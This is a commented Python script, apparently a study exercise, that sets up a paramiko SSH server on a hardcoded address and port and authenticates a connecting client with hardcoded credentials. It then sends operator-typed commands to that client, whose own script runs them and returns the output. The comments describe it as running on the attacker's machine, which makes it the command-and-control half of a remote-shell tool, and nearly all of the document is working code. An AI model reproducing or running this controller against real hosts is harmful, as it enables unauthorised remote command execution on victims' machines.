# SSH server using paramiko that listens for inbound connections, authenticates clients against hardcoded credentials, 
# and provides an interactive command prompt to control a connected client.

import os
import paramiko
import socket
import sys
import threading

# setup
CWD = os.path.dirname(os.path.realpath(__file__)) # pulls the current directory this script is saved in
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key')) # finds the RSA key to prove identity to the client

# server rules
class Server (paramiko.ServerInterface): # inherits paramiko's ServerInterface, which handles authentication
    def __init__(self):
        self.event = threading.Event() # sets up a threading event object

    def check_channel_request(self, kind, chanid):
        if kind == 'session': 
            return paramiko.OPEN_SUCCEEDED # allows standard session channels
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED # rejects everything that's not 'session'

    # hardcoded credentials that can be changed, doesn't need to be secure since this is running on the attacker's machine
    def check_auth_password(self, username, password):
        if (username == 'john') and (password == 'allard'):
            return paramiko.AUTH_SUCCESSFUL

if __name__ == '__main__':
    # hard coded that can be changed as needed
    server = '192.168.1.207'
    ssh_port = 2222
    try:
        # start the TCP listening
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creates a standard TCP/IP socket
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # configures the socket so the port can be reused if the script is restarted
        sock.bind((server, ssh_port)) # binds the socket to the specified server and port
        sock.listen(100)
        print('[+] Listening for connection ...')
        client, addr = sock.accept() # the code will stop here and wait until a client connects, then saves the client socket object and it's IP/port address
    except Exception as e:
        print('[-] Listen failed: ' + str(e)) # print error message
        sys.exit(1)
    else:
        print('[+] Got a connection!', client, addr)

    # establish the SSH transport layer
    bhSession = paramiko.Transport(client) # wraps the socket connection into a paramiko SSH object
    bhSession.add_server_key(HOSTKEY) # add the RSA host key so the server can authenticate itself to the client
    server = Server() # instantiate the server class
    bhSession.start_server(server=server) # starts the server using the rules defined in the Server class

    # accept the channel and read the first message from client
    chan = bhSession.accept(20) # wait up to 20 seconds for the client to authenticate and open a channel
    if chan is None:
        print('*** No channel.')
        sys.exit(1)

    print('[+] Authenticated!')
    print(chan.recv(1024)) # print message received from client
    chan.send('Welcome to bh_ssh') # send a welcome message back to the client
    try:
        # loop for inputting commands to the client from the server
        # note, the ssh_cmd script running on the client will take care of parsing and running the commands on the client
        while True:
            command= input("Enter command: ")
            if command != 'exit':
                chan.send(command)
                r = chan.recv(8192)
                print(r.decode())
            else:
                chan.send('exit')
                print('exiting')
                bhSession.close()
                break
    except KeyboardInterrupt:
        bhSession.close()
